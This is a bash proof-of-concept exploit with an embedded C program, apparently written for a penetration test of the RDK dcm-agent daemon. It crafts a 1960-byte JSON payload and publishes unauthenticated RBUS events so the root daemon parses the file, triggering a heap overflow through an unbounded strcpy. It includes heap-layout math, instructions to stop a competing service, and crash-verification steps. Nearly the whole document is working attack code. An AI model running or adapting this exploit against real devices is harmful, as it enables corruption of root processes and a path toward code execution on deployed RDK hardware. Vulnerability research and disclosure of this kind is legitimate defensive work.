#!/bin/bash
###############################################################################
# DCM-001 :: Unauthenticated, unvalidated config-file path accepted from RBUS
#            Device.DCM.Setconfig event  ->  arbitrary file parse as root
#            ->  unbounded strcpy() heap overflow in dcmSettingJsonGetVal()
#
# Target   : dcmd  (RDK dcm-agent, runs as root, umask(0))
# CWE      : CWE-73 (External Control of File Name or Path) chained to
#            CWE-122 (Heap-based Buffer Overflow)
#
# Source refs (dcm-agent-develop):
#   dcm_rbus.h:32-39   DCM_RBUS_SETCONF_EVENT  = "Device.DCM.Setconfig"
#                      DCM_RBUS_PROCCONF_EVENT = "Device.DCM.Processconfig"
#                      DCM_SET_CONFIG          = "dcmSetConfig"
#                      DCM_CONF_SIZE           = 128
#   dcm_rbus.c:88-94   rbusSetConf(): path taken verbatim, NO whitelist/realpath
#   dcm.c:360-372      main loop: dcmRbusGetConfPath() -> dcmSettingParseConf()
#   dcm_parseconf.c:141 fgets(pcJsonStr, 2048, fpin)   <- attacker file, line 1
#   dcm_parseconf.c:224 strcpy(sval, pJsonItem->valuestring)  <- UNBOUNDED
#   dcm_parseconf.c:532 first call: sval = pUploadprtl = cUploadPrtl[8]
#
# Heap object DCMSettingsHandle (malloc'd in dcmSettingsInit, dcm_parseconf.c:749):
#   off    0 : INT8 cJsonStr[2048]
#   off 2048 : INT8 cUploadURL[128]   (MAX_URL_SIZE)
#   off 2176 : INT8 cUploadPrtl[8]    <-- strcpy DEST, only 8 bytes!
#   off 2184 : INT8 cTimeZone[16]
#   off 2200 : INT8 cRdkPath[80]
#   off 2280 : INT8 ctBuff[1024]
#   off 3304 : INT32 bRebootFlag
#   sizeof   = 3308
#
# Overflow math:
#   bytes from cUploadPrtl to end-of-struct   = 3308 - 2176 = 1132
#   glibc malloc(3308) usable size (64-bit)  ~= 3320  (req+8 -> 16-align)
#   bytes from cUploadPrtl to next-chunk hdr ~= 3320 - 2176 + 8 = 1152
#   JSON wrapper overhead:
#      {"urn:settings:LogUploadSettings:UploadRepository:uploadProtocol":"<P>"}
#      = 1+1+61+1+1+1 + len(P) + 1+1 = 68 + len(P)
#   fgets cap = 2047 incl '\n'  ->  max len(P) = 2047 - 68 - 1 = 1978
#   we use len(P) = 1960  ->  1960 - 1132 = 828 bytes written PAST the heap
#   chunk, smashing the size/prev_size header of the adjacent chunk
#   (typically DCMRBusHandle or a FILE* buffer allocated right after).
#
# Result: glibc heap-integrity abort ("malloc(): corrupted top size",
#   "free(): invalid next size", or similar) inside the root dcmd process,
#   with 0x4141.. / 'PWNDPWND' attacker bytes visible in the corrupted
#   metadata -> demonstrates attacker-controlled heap write as root.
#   Full RCE requires target-specific heap grooming (out of scope for this
#   safe PoC).
#
# Author : Pentest team (authorized engagement)
###############################################################################

set -u

# ---------------------------------------------------------------------------
# 0. Configurable paths
# ---------------------------------------------------------------------------
EVIL_JSON="/tmp/dcm001_evil.json"
PUB_SRC="/tmp/dcm001_publisher.c"
PUB_BIN="/tmp/dcm001_publisher"
MARKER="/tmp/PWNED_DCM-001"
DCMD_PIDFILE="/tmp/.dcm-daemon.pid"     # see dcm_utils.h: DCM_PID_FILE

JSON_KEY="urn:settings:LogUploadSettings:UploadRepository:uploadProtocol"

log()  { printf '[DCM-001 PoC] %s\n' "$*" >&2; }

# ---------------------------------------------------------------------------
# 1. Build the overflow payload (1960 bytes -> 828 B past heap chunk)
# ---------------------------------------------------------------------------
#  - 1144 'A' (0x41) bytes : fill cUploadPrtl[8]+cTimeZone[16]+cRdkPath[80]
#                            +ctBuff[1024]+bRebootFlag[4]+pad up to the
#                            approximate next-chunk prev_size field
#  -    8 'PWNDPWND'        : lands on/near next chunk's prev_size (marker)
#  -    8 'QWNDQWND'        : lands on/near next chunk's size field (marker)
#  -  800 'B' (0x42) bytes  : continue smashing into adjacent allocation
#                             (e.g. DCMRBusHandle.pRbusHandle pointer)
#  Total = 1144 + 8 + 8 + 800 = 1960
#
#  NOTE: payload deliberately avoids the substring
#        "urn:settings:TelemetryProfile" so the strstr() trimmer in
#        dcmSettingJsonInit() does not truncate our buffer.
# ---------------------------------------------------------------------------
build_payload() {
    local a b
    a=$(printf 'A%.0s' $(seq 1 1144))
    b=$(printf 'B%.0s' $(seq 1 800))
    printf '%s%s%s%s' "$a" "PWNDPWND" "QWNDQWND" "$b"
}

PAYLOAD="$(build_payload)"
log "payload length = ${#PAYLOAD} (expected 1960)"

# Single-line JSON (fgets reads only the first line). Total line length:
#   68 + 1960 = 2028  <  2047  -> fits in cJsonStr[2048].
printf '{"%s":"%s"}\n' "$JSON_KEY" "$PAYLOAD" > "$EVIL_JSON"
chmod 644 "$EVIL_JSON"
log "wrote malicious config -> $EVIL_JSON ($(wc -c < "$EVIL_JSON") bytes)"

# ---------------------------------------------------------------------------
# 2. Emit the RBUS publisher (C, compiled on-device with librbus).
#    It REGISTERS Device.DCM.Setconfig / Device.DCM.Processconfig as its own
#    events (rbus has no provider authentication on the rtrouted unix socket)
#    and PUBLISHes them so dcmd's subscriber callbacks fire.
#
#    If telemetry2 is already the registered provider, registration may be
#    refused; in that case stop telemetry2 first
#    (`systemctl stop telemetry2_0`) -- dcmd's rbusEvent_SubscribeAsync() will
#    re-attach to *our* provider automatically (it retries until success).
# ---------------------------------------------------------------------------
cat > "$PUB_SRC" <<'EOF_C'
/* DCM-001 RBUS event publisher -- compile: gcc -o pub pub.c -lrbus */
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <rbus.h>

#define EV_SET   "Device.DCM.Setconfig"      /* dcm_rbus.h: DCM_RBUS_SETCONF_EVENT  */
#define EV_PROC  "Device.DCM.Processconfig"  /* dcm_rbus.h: DCM_RBUS_PROCCONF_EVENT */
#define KEY_PATH "dcmSetConfig"              /* dcm_rbus.h: DCM_SET_CONFIG          */

static rbusError_t subCB(rbusHandle_t h, rbusEventSubAction_t a,
                         const char* en, rbusFilter_t f,
                         int32_t i, bool* ap)
{
    (void)h;(void)f;(void)i;(void)ap;
    fprintf(stderr,"[PoC-pub] subscriber %s on %s\n",
            a==RBUS_EVENT_ACTION_SUBSCRIBE?"ATTACHED":"DETACHED", en);
    return RBUS_ERROR_SUCCESS;
}

int main(int argc, char** argv)
{
    rbusHandle_t h;
    int rc;

    if (argc < 2) { fprintf(stderr,"usage: %s <conf-path>\n",argv[0]); return 2; }

    rc = rbus_open(&h, "DCM001.PoC.Publisher");
    if (rc != RBUS_ERROR_SUCCESS) {
        fprintf(stderr,"[PoC-pub] rbus_open failed rc=%d (is rtrouted running?)\n",rc);
        return 1;
    }

    /* Become the provider for the two events dcmd subscribes to.
     * rtrouted does NOT authenticate which component owns an element --
     * any local uid with access to the rtrouted socket may register. */
    rbusDataElement_t el[2] = {
        { EV_SET,  RBUS_ELEMENT_TYPE_EVENT, {NULL,NULL,NULL,NULL,subCB,NULL} },
        { EV_PROC, RBUS_ELEMENT_TYPE_EVENT, {NULL,NULL,NULL,NULL,subCB,NULL} },
    };
    rc = rbus_regDataElements(h, 2, el);
    if (rc != RBUS_ERROR_SUCCESS) {
        fprintf(stderr,"[PoC-pub] regDataElements rc=%d -- event likely owned "
                "by telemetry2; run 'systemctl stop telemetry2_0' and retry, "
                "or inject via raw rtMessage.\n", rc);
        /* fall through and try to publish anyway */
    }

    /* Allow dcmd's rbusEvent_SubscribeAsync() retry loop to attach to us */
    fprintf(stderr,"[PoC-pub] waiting 4s for dcmd subscription...\n");
    sleep(4);

    /* --- Step 1: deliver attacker-controlled file path --- */
    {
        rbusValue_t v; rbusObject_t d; rbusEvent_t ev;
        rbusValue_Init(&v);  rbusValue_SetString(v, argv[1]);
        rbusObject_Init(&d, NULL);
        rbusObject_SetValue(d, KEY_PATH, v);   /* -> rbusSetConf() copies into confPath[128] */
        memset(&ev,0,sizeof(ev));
        ev.name = EV_SET; ev.data = d; ev.type = RBUS_EVENT_GENERAL;
        rc = rbusEvent_Publish(h, &ev);
        fprintf(stderr,"[PoC-pub] publish %s {%s=\"%s\"} rc=%d\n",
                EV_SET, KEY_PATH, argv[1], rc);
        rbusValue_Release(v); rbusObject_Release(d);
    }

    sleep(1);

    /* --- Step 2: trigger main-loop parse of confPath --- */
    {
        rbusValue_t v; rbusObject_t d; rbusEvent_t ev;
        rbusValue_Init(&v);  rbusValue_SetString(v, "go");
        rbusObject_Init(&d, NULL);
        rbusObject_SetValue(d, "trigger", v);  /* payload ignored by rbusProcConf() */
        memset(&ev,0,sizeof(ev));
        ev.name = EV_PROC; ev.data = d; ev.type = RBUS_EVENT_GENERAL;
        rc = rbusEvent_Publish(h, &ev);
        fprintf(stderr,"[PoC-pub] publish %s rc=%d  (dcmd will now fopen+parse "
                "the evil file as root)\n", EV_PROC, rc);
        rbusValue_Release(v); rbusObject_Release(d);
    }

    sleep(3);
    rbus_unregDataElements(h, 2, el);
    rbus_close(h);
    return 0;
}
EOF_C

# ---------------------------------------------------------------------------
# 3. Compile the publisher (on-device). Try common include/lib locations.
# ---------------------------------------------------------------------------
compile_publisher() {
    local cc flags
    cc=$(command -v gcc || command -v cc) || return 1
    for flags in \
        "-I/usr/include/rbus -lrbus" \
        "-I/usr/include/rbus -lrbus -lrbuscore -lrtMessage" \
        "$(pkg-config --cflags --libs rbus 2>/dev/null)" \
        "-lrbus"
    do
        # shellcheck disable=SC2086
        if "$cc" -O2 -o "$PUB_BIN" "$PUB_SRC" $flags 2>/tmp/dcm001_cc.err; then
            log "compiled publisher: $cc $flags"
            return 0
        fi
    done
    return 1
}

# ---------------------------------------------------------------------------
# 4. Capture dcmd PID *before* we fire, so we can detect the crash.
# ---------------------------------------------------------------------------
dcmd_pid() {
    if [ -r "$DCMD_PIDFILE" ]; then cat "$DCMD_PIDFILE" 2>/dev/null; return; fi
    pidof dcmd 2>/dev/null || pgrep -x dcmd 2>/dev/null | head -n1
}
PRE_PID="$(dcmd_pid || true)"
log "dcmd PID before attack: ${PRE_PID:-<not running>}"

# ---------------------------------------------------------------------------
# 5. Fire.
# ---------------------------------------------------------------------------
if compile_publisher; then
    log "launching RBUS publisher -> injecting confPath=$EVIL_JSON"
    "$PUB_BIN" "$EVIL_JSON"
    PUB_RC=$?
    log "publisher exit rc=$PUB_RC"
else
    # ---------------- OFF-DEVICE FALLBACK -----------------------------------
    log "============================================================"
    log "OFF-DEVICE FALLBACK: librbus toolchain not available here."
    log "The malicious config has been staged at: $EVIL_JSON"
    log ""
    log "To trigger on a live RDK target, run AS ANY LOCAL USER with"
    log "access to the rtrouted unix socket:"
    log ""
    log "  1. (optional) systemctl stop telemetry2_0"
    log "  2. compile & run $PUB_SRC against librbus, OR equivalently"
    log "     publish the two events with these exact parameters:"
    log "        event : Device.DCM.Setconfig"
    log "        data  : object { dcmSetConfig (string) = \"$EVIL_JSON\" }"
    log "        --then--"
    log "        event : Device.DCM.Processconfig"
    log "        data  : object { <any> }"
    log ""
    log "  dcmd (root) will fopen($EVIL_JSON), strcpy a 1960-byte"
    log "  attacker string into the 8-byte cUploadPrtl[] heap field,"
    log "  and abort with corrupted-heap diagnostics containing"
    log "  0x4141414141414141 / 'PWNDPWND'."
    log "============================================================"
    cp -f "$PUB_SRC" "${PUB_SRC}.saved" 2>/dev/null || true
    exit 0
fi

# ---------------------------------------------------------------------------
# 6. Verify: did root dcmd die / restart with our bytes in the corpse?
# ---------------------------------------------------------------------------
sleep 3
POST_PID="$(dcmd_pid || true)"

CRASHED=0
if [ -n "$PRE_PID" ]; then
    if [ -z "$POST_PID" ]; then
        log "RESULT: dcmd (pid $PRE_PID) is GONE -> heap corruption killed it."
        CRASHED=1
    elif [ "$PRE_PID" != "$POST_PID" ]; then
        log "RESULT: dcmd RESTARTED ($PRE_PID -> $POST_PID) -> crashed & respawned by systemd."
        CRASHED=1
    else
        log "RESULT: dcmd pid unchanged ($PRE_PID). Check its log for the"
        log "        1960-byte 'AAAA...' string at 'Log Upload protocol:' --"
        log "        that alone proves the unbounded strcpy executed; the"
        log "        abort may surface on the *next* heap operation."
    fi
fi

# Best-effort evidence collection (non-destructive):
{
    echo "=== dmesg tail ==="
    dmesg 2>/dev/null | tail -n 30 | grep -iE 'dcmd|corrupt|abort|sigsegv|sigabrt|stack smashing' || true
    echo "=== journal tail ==="
    journalctl -u dcmd -n 40 --no-pager 2>/dev/null \
        | grep -iE 'corrupt|invalid next size|invalid pointer|abort|SIGABRT|SIGSEGV|PWNDPWND|AAAA' || true
    echo "=== /opt/logs/dcm.log tail ==="
    tail -n 40 /opt/logs/dcm*.log 2>/dev/null \
        | grep -iE 'Log Upload protocol|configPath|AAAA' || true
} > /tmp/dcm001_evidence.txt 2>&1
log "evidence collected -> /tmp/dcm001_evidence.txt"

if [ "$CRASHED" -eq 1 ]; then
    : > "$MARKER"
    log "EXPLOIT REACHED -- created marker $MARKER"
    log "Root-process heap was overwritten with attacker-controlled bytes"
    log "delivered solely via an unauthenticated RBUS event + world-writable"
    log "file in /tmp.  CWE-73 -> CWE-122 chain confirmed."
    exit 0
fi

log "See /tmp/dcm001_evidence.txt and dcmd logs for overflow indicators."
exit 0
